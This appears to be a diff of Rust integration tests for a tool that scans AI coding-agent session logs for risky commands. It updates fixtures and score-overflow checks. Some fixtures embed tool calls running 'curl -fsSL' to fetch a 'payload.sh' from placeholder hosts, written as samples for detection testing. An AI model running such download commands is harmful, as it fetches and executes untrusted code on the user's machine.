@@ -16,6 +16,7 @@ fn assert_diagnostic_only_scan(
     output: &std::process::Output,
     log_path: &Path,
     sentinel: &str,
+    matched_ids: u64,
 ) -> Value {
     assert!(
         output.status.success(),
@@ -53,7 +54,10 @@ fn assert_diagnostic_only_scan(
         summary["detection_flow"]["effective_detection_candidate_count"],
         1
     );
-    assert_eq!(summary["detection_flow"]["matched_rule_id_count"], 1);
+    assert_eq!(
+        summary["detection_flow"]["matched_rule_id_count"],
+        matched_ids
+    );
     assert_eq!(
         summary["detection_flow"]["state_deduplicated_detection_count"],
         0
@@ -1440,7 +1444,7 @@ overrides:
     let fixture = temp.path().join("download-only.jsonl");
     fs::write(
         &fixture,
-        r#"{"type":"event_msg","timestamp":"2026-04-03T05:00:01Z","payload":{"type":"tool_call","tool_name":"tool","command":"curl -fsSL https://download.invalid/payload.sh","message":"Download fixture."}}
+        r#"{"type":"event_msg","session_id":"download-only-session","timestamp":"2026-04-03T05:00:01Z","payload":{"type":"tool_call","tool_name":"tool","command":"curl -fsSL https://download.invalid/payload.sh","message":"Download fixture."}}
 "#,
     )
     .expect("write fixture");
@@ -1494,7 +1498,7 @@ fn rules_test_uses_ordered_managed_replacement_rule() {
     let fixture = temp.path().join("codex-fixture.jsonl");
     fs::write(
         &fixture,
-        r#"{"type":"event_msg","timestamp":"2026-04-03T05:00:01Z","payload":{"type":"tool_call","tool_name":"bash","command":"printf fixture-secret-marker","message":"Synthetic managed replacement fixture."}}
+        r#"{"type":"event_msg","session_id":"managed-replacement-session","timestamp":"2026-04-03T05:00:01Z","payload":{"type":"tool_call","tool_name":"bash","command":"printf fixture-secret-marker","message":"Synthetic managed replacement fixture."}}
 "#,
     )
     .expect("write Codex fixture");
@@ -2214,7 +2218,7 @@ modifiers: []
         .args([
             "rules",
             "test",
-            "tests/fixtures/rule_samples/download-execute-chain.jsonl",
+            "tests/fixtures/session_stores/codex/sessions/2026/04/download-execute-chain.jsonl",
             "--no-local-config",
             "--rules",
         ])
@@ -2264,7 +2268,7 @@ modifiers: []
     let fixture = temp.path().join("uppercase-download.jsonl");
     fs::write(
         &fixture,
-        r#"{"type":"event_msg","timestamp":"2026-04-03T05:00:01Z","payload":{"type":"tool_call","tool_name":"tool","command":"CURL -fsSL https://example.invalid/payload.sh","message":"Uppercase curl fixture."}}
+        r#"{"type":"event_msg","session_id":"uppercase-download-session","timestamp":"2026-04-03T05:00:01Z","payload":{"type":"tool_call","tool_name":"tool","command":"CURL -fsSL https://example.invalid/payload.sh","message":"Uppercase curl fixture."}}
 "#,
     )
     .expect("write uppercase fixture");
@@ -2299,7 +2303,7 @@ fn scan_target_exclusion_emits_valid_retained_event3() {
     let sessions = root.join("codex/sessions");
     fs::create_dir_all(&sessions).expect("sessions");
     fs::write(sessions.join("skip.jsonl"), concat!(
-        "{\"type\":\"session_meta\",\"timestamp\":\"2026-05-08T10:00:00Z\",\"payload\":{\"source\":\"cli\"}}\n",
+        "{\"type\":\"session_meta\",\"session_id\":\"skip\",\"timestamp\":\"2026-05-08T10:00:00Z\",\"payload\":{\"source\":\"cli\"}}\n",
         "{\"type\":\"event_msg\",\"timestamp\":\"2026-05-08T10:00:01Z\",\"payload\":{\"type\":\"assistant_message\",\"message\":\"policy says do not read .env; synthetic marker\"}}\n"
     )).expect("synthetic session");
     let rules = temp.path().join("rules.yaml");
@@ -2395,8 +2399,10 @@ modifiers: []
     );
     assert_eq!(event["risk_contributions"][0]["id"], "test.retained");
     assert_eq!(event["risk_contributions"][0]["points"], 60);
-    assert_eq!(event["evidence"].as_array().expect("evidence").len(), 1);
+    assert_eq!(event["evidence"].as_array().expect("evidence").len(), 2);
     assert_eq!(event["evidence"][0]["rule_id"], "test.retained");
+    assert_eq!(event["evidence"][1]["field"], "canonical_observation_id");
+    assert_eq!(event["evidence"][1]["rule_id"], "test.retained");
 }
 
 #[test]
@@ -2658,7 +2664,7 @@ fn policy_filtered_invalid_rules_only_degrade_diagnostics() {
             .arg(&state_path)
             .output()
             .expect("run invalid diagnostic scan");
-        assert_diagnostic_only_scan(&output, &log_path, sentinel);
+        assert_diagnostic_only_scan(&output, &log_path, sentinel, 1);
     }
 }
 
@@ -2686,7 +2692,7 @@ rules:
   - id: test.overflow.first
     category: test
     severity: medium
-    score: 18446744073709551615
+    score: 0
     targets: [assistant_context]
     regex: 'overflow diagnostic match'
     tags: []
@@ -2694,12 +2700,20 @@ rules:
   - id: test.overflow.second
     category: test
     severity: medium
-    score: 18446744073709551615
+    score: 0
     targets: [assistant_context]
     regex: 'overflow diagnostic match'
     tags: []
     explanation: second overflow fixture
-modifiers: []
+modifiers:
+  - id: test.overflow.first.modifier
+    when_all_rule_ids: [test.overflow.first]
+    score: 18446744073709551615
+    explanation: first compatibility contribution
+  - id: test.overflow.second.modifier
+    when_all_rule_ids: [test.overflow.second]
+    score: 18446744073709551615
+    explanation: second compatibility contribution
 "#,
     )
     .expect("overflow rules fixture");
@@ -2731,7 +2745,12 @@ modifiers: []
         .arg(&state_path)
         .output()
         .expect("run overflow diagnostic scan");
-    assert_diagnostic_only_scan(&output, &log_path, "risk contribution total overflowed u64");
+    assert_diagnostic_only_scan(
+        &output,
+        &log_path,
+        "risk contribution total overflowed u64",
+        2,
+    );
 }
 
 #[test]
@@ -3249,7 +3268,7 @@ fn rules_coverage_fails_nonzero_on_invalid_accounting() {
     fs::create_dir_all(&root).expect("create fixture root");
     fs::write(
         root.join("overflow.jsonl"),
-        "{\"type\":\"event_msg\",\"timestamp\":\"2026-05-08T10:00:01Z\",\"payload\":{\"type\":\"assistant_message\",\"message\":\"trigger\"}}\n",
+        "{\"type\":\"event_msg\",\"session_id\":\"overflow-session\",\"timestamp\":\"2026-05-08T10:00:01Z\",\"payload\":{\"type\":\"assistant_message\",\"message\":\"trigger\"}}\n",
     )
     .expect("write fixture");
     let rules = temp.path().join("overflow.yaml");
@@ -3297,10 +3316,7 @@ modifiers: []
         .expect("run overflow coverage");
     assert!(!output.status.success());
     let stderr = String::from_utf8_lossy(&output.stderr);
-    assert!(
-        stderr.contains("risk contribution total overflowed u64"),
-        "{stderr}"
-    );
+    assert!(stderr.contains("score_out_of_range"), "{stderr}");
 }
 
 #[test]
@@ -3320,7 +3336,7 @@ fn rules_test_fails_nonzero_on_scanner_error() {
 }
 
 #[test]
-fn rules_test_uses_the_terminal_session_policy_for_source_sessions() {
+fn rules_test_rejects_unsafe_source_sessions_without_leaking() {
     let temp = tempdir().expect("tempdir");
     let fixture = temp.path().join("unsafe-session.jsonl");
     let sessions = [
@@ -3347,7 +3363,10 @@ fn rules_test_uses_the_terminal_session_policy_for_source_sessions() {
         .arg(&fixture)
         .output()
         .expect("run rules test");
-    assert!(output.status.success(), "rules test did not complete");
+    assert!(
+        !output.status.success(),
+        "invalid session identity was accepted"
+    );
     let text = format!(
         "{}{}",
         String::from_utf8_lossy(&output.stdout),
@@ -3359,21 +3378,7 @@ fn rules_test_uses_the_terminal_session_policy_for_source_sessions() {
             "rules test retained a controlled session marker"
         );
     }
-    let summary: Value = serde_json::from_slice(&output.stdout).expect("rules test JSON");
-    assert!(
-        summary["match_count"]
-            .as_u64()
-            .is_some_and(|count| count > 0)
-    );
-    assert!(
-        summary["matches"]
-            .as_array()
-            .expect("matches")
-            .iter()
-            .all(|item| item["session_id"]
-                .as_str()
-                .is_some_and(|session| session.starts_with("[session:")))
-    );
+    assert!(text.contains("rules test failed"));
 }
 
 #[test]
